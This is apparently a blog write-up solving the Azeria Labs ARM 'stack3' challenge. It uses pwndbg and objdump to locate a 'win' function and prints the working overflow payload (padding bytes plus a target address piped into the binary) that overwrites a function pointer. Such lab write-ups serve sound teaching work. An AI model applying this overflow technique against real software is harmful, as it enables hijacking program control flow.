---
layout: post
title: "Smashing ARM Stack for Fun - Part IV"
tags: [reversing, exploiting, ARM, iasm, azeria-labs, objdump]
inline_default_language: nasm
---

This time the goal is to make the program print the message
`"code flow successfully changed"`{.cpp}.<!--more-->

## A manual `xref`{.cpp}

Let's see where this message is stored:

```nasm
pwndbg> search "code flow successfully changed"
stack3          0x10560 0x65646f63 /* 'code flow successfully changed'*/
stack3          0x20560 0x65646f63 /* 'code flow successfully changed'*/
```

And from where the executable makes a reference to it? In other
words, where in the code segment this address is stored?

```nasm
pwndbg> search -4 --executable 0x10560
stack3          0x10490 0x10560
stack3          0x10c6c 0x10560
stack3          0x20490 0x10560
```

To summarize the message (and array of chars) is stored at 0x10560
and the address 0x10560 is stored in 0x10490, 0x10c6c and 0x20490.

These addresses are the `char*`{.cpp} that the program must load into a
register to do a call to `printf`{.cpp} or `puts`{.cpp}.

Let's assume that one of those addresses is loaded in a register using an
instruction like this:

```nasm
<???>     ldr   r?, [pc, #offset?]
```

It is a reasonable assumption: the rest of the challenges so far used
this instruction.

We don't know neither which register will be using nor the offset so we
will have to guess.

Let's see what we can find with `objdump`{.cpp} and `grep`{.cpp}:

```nasm
pi@raspberrypi:~$ objdump -d stack3 | grep "ldr.*r[0-9], \[pc"
   10374:       e59f000c        ldr     r0, [pc, #12]   ; 10388 <_start+0x34>
   10378:       e59f300c        ldr     r3, [pc, #12]   ; 1038c <_start+0x38>
   10390:       e59f3014        ldr     r3, [pc, #20]   ; 103ac <call_weak_fn+0x1c>
   10394:       e59f2014        ldr     r2, [pc, #20]   ; 103b0 <call_weak_fn+0x20>
   103b4:       e59f301c        ldr     r3, [pc, #28]   ; 103d8 <deregister_tm_clones+0x24>
   103b8:       e59f001c        ldr     r0, [pc, #28]   ; 103dc <deregister_tm_clones+0x28>
   103c8:       e59f3010        ldr     r3, [pc, #16]   ; 103e0 <deregister_tm_clones+0x2c>
   103e4:       e59f1024        ldr     r1, [pc, #36]   ; 10410 <register_tm_clones+0x2c>
   103e8:       e59f0024        ldr     r0, [pc, #36]   ; 10414 <register_tm_clones+0x30>
   10400:       e59f3010        ldr     r3, [pc, #16]   ; 10418 <register_tm_clones+0x34>
   10420:       e59f4018        ldr     r4, [pc, #24]   ; 10440 <__do_global_dtors_aux+0x24>
   10448:       e59f0024        ldr     r0, [pc, #36]   ; 10474 <frame_dummy+0x30>
   10460:       e59f3010        ldr     r3, [pc, #16]   ; 10478 <frame_dummy+0x34>
   10484:       e59f0004        ldr     r0, [pc, #4]    ; 10490 <win+0x14>
   104c8:       e59f0018        ldr     r0, [pc, #24]   ; 104e8 <main+0x54>
   104f4:       e59f604c        ldr     r6, [pc, #76]   ; 10548 <__libc_csu_init+0x5c>
   104f8:       e59f504c        ldr     r5, [pc, #76]   ; 1054c <__libc_csu_init+0x60>
```

These two lines are interesting:

```nasm
   10484:       e59f0004        ldr     r0, [pc, #4]    ; 10490 <win+0x14>
   104c8:       e59f0018        ldr     r0, [pc, #24]   ; 104e8 <main+0x54>
```

And the winner is 0x10484!

```python
>>> 0x10484 + 0x4 + 0x8
0x10490
```

See how 0x10484 the address of the `ldr` instruction plus the offset
`0x4`{.none} plus 0x8 bytes yields an address (0x10490) that we found before, a
`char*`{.cpp}.

If we dereference it we will see the address of the message:

```nasm
pwndbg> x/1wx 0x10490
0x10490 <win+20>:       0x00010560

pwndbg> x/1bs 0x00010560
0x10560:        "code flow successfully changed"
```

So, our target is:

```nasm
pwndbg> pdisass 0x10484-8
 ► 0x1047c <win>        push   {fp, lr}
   0x10480 <win+4>      add    fp, sp, #4
   0x10484 <win+8>      ldr    r0, [pc, #4]
   0x10488 <win+12>     bl     #puts@plt <puts@plt>

   0x1048c <win+16>     pop    {fp, pc}
```

### A comment

This is not the only way to do it.

I could search for a `puts`{.cpp} call that would be more likely to be the
one that we are looking for:

```shell
pi@raspberrypi:~$ objdump -d stack3 | grep "puts"
00010324 <puts@plt>:
   10488:       ebffffa5        bl      10324 <puts@plt>
```

I could look which functions are available:

```nasm
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x000102ec  _init
0x0001030c  printf@plt
0x00010318  gets@plt
0x00010324  puts@plt
<...>
0x0001047c  win
0x00010494  main
<...>
```

I could use IDA or [Radare2](https://rada.re/n/radare2.html) or similar
and do a `xref`{.cpp}...

Or I could just read what is the goal from the
[challenge](https://azeria-labs.com/part-3-stack-overflow-challenges/).

I preferred a longer path to explore more the commands of `pwndbg`{.cpp}
and stress a little more my brain.

Otherwise it wouldn't be fun :)

## Let's jump

This is the `main`{.cpp} function:

```nasm
pwndbg> pdisass &main 9
 ► 0x10494 <main>       push   {fp, lr}
   0x10498 <main+4>     add    fp, sp, #4
   0x1049c <main+8>     sub    sp, sp, #0x50
   0x104a0 <main+12>    str    r0, [fp, #-0x50]
   0x104a4 <main+16>    str    r1, [fp, #-0x54]
   0x104a8 <main+20>    mov    r3, #0
   0x104ac <main+24>    str    r3, [fp, #-8]
   0x104b0 <main+28>    sub    r3, fp, #0x48
   0x104b4 <main+32>    mov    r0, r3
   0x104b8 <main+36>    bl     #gets@plt <gets@plt>

   0x104bc <main+40>    ldr    r3, [fp, #-8]
   0x104c0 <main+44>    cmp    r3, #0
   0x104c4 <main+48>    beq    #main+72 <main+72>

   0x104c8 <main+52>    ldr    r0, [pc, #0x18]
   0x104cc <main+56>    ldr    r1, [fp, #-8]
   0x104d0 <main+60>    bl     #printf@plt <printf@plt>

   0x104d4 <main+64>    ldr    r3, [fp, #-8]
   0x104d8 <main+68>    blx    r3
```

So instead of a cookie like in the
[stack0](/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html)
or [stack1](/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-II.html)
we have the address of a function.

{% call marginnotes() %}
`blx r3` is an unconditional jump to an absolute address
([docs](https://developer.arm.com/documentation/dui0068/b/arm-instruction-reference/arm-branch-instructions/blx?lang=en)).
<br />
That's why it works.
 {% endcall %}

The address is initialized to zero but due to a stack overflow we can
write an arbitrary address, in particular, the address of `win`{.cpp}:
0x0001047c

```shell
pi@raspberrypi:~$ echo -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x7c\x04\x01\x00' | ./stack3
calling function pointer, jumping to 0x0001047c
code flow successfully changed
```

We could also jump to the middle of `win`{.cpp}, to 0x00010484, and we will
have the same result. The only problem is that the program will execute
the *epilogue* of `win`{.cpp} **without** having executed its *prologue*.

{% call marginnotes() %}
Does this ring some bells? This is the base of *return oriented
programming* or ROP.
 {% endcall %}

The result? `pop {fp, pc}` will restore `pc` to the next element in the
stack which most likely will not be a valid address. Happy segfault!

```shell
pi@raspberrypi:~$ echo -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x84\x04\x01\x00' | ./stack3
calling function pointer, jumping to 0x00010484
code flow successfully changed
Segmentation fault
```
